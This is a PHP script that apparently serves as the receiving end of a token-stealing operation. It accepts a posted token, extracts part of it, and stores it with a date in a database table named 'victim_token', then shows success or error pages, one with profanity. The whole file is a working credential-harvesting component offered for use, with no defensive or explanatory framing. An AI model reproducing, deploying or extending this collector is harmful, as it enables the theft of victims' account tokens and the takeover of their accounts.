<?php
require "connect_db.php";

if(isset($_POST['token'])){
    if(empty($_POST['token'])){
        echo "<!DOCTYPE html>";
        echo "<html>";
        echo "<link rel=\"stylesheet\" href=\"css/bootstrap.min.css\">";
        echo "<body style=\"background-color:black\">";
        echo "<center>";
        echo "<div class=\"jumbotron\" style=\"background-color:black\">";
        echo "<a href=\"index.php\">";
        echo "<h1 class=\"btn btn-danger\" style=\"color:white\">#ERROR #BLANK TOKEN</h1>";
        echo "</a>";
        echo "</div>";
        echo "</center>";
        echo "</body>";
        echo "</html>";
        
    }else{
        $token_value = mysqli_real_escape_string($connect_db, $_POST['token']);
        $sub_token = substr($token_value, 51, 219);
        $datet = date("j-F-Y",time());
        $sqlquery = "INSERT INTO victim_token (token_value, token_date) VALUES ('$sub_token', '$datet')";
        $result = mysqli_query($connect_db, $sqlquery);
        if($result == TRUE){
            echo "<!DOCTYPE html>";
            echo "<html>";
            echo "<link rel=\"stylesheet\" href=\"css/bootstrap.min.css\">";
            echo "<body style=\"background-color:black\">";
            echo "<center>";
            echo "<div class=\"jumbotron\" style=\"background-color:black\">";
            echo "<a href=\"index.php\">";
            echo "<h1 class=\"btn btn-primary\" style=\"color:white\">#OK #SUCCESS</h1>";
            echo "</a>";
            echo "</div>";
            echo "</center>";
            echo "</body>";
            echo "</html>";
        }else{
            echo "<!DOCTYPE html>";
            echo "<html>";
            echo "<link rel=\"stylesheet\" href=\"css/bootstrap.min.css\">";
            echo "<body style=\"background-color:black\">";
            echo "<center>";
            echo "<div class=\"jumbotron\" style=\"background-color:black\">";
            echo "<a href=\"index.php\">";
            echo "<h1 class=\"btn btn-danger\" style=\"color:white\">#ERROR CAN'T TEMP</h1>";
            echo "</a>";
            echo "</div>";
            echo "</center>";
            echo "</body>";
            echo "</html>";
            
        }
mysqli_close($connect_db);
    }
}else{
    echo "<!DOCTYPE html>";
            echo "<html>";
            echo "<link rel=\"stylesheet\" href=\"css/bootstrap.min.css\">";
            echo "<body style=\"background-color:black\">";
            echo "<center>";
            echo "<div class=\"jumbotron\" style=\"background-color:black\">";
            echo "<a href=\"index.php\">";
            echo "<h1 class=\"btn btn-danger\" style=\"color:white\">#FUCK GO TO HOME NOW</h1>";
            echo "</a>";
            echo "</div>";
            echo "</center>";
            echo "</body>";
            echo "</html>";
    
}

?>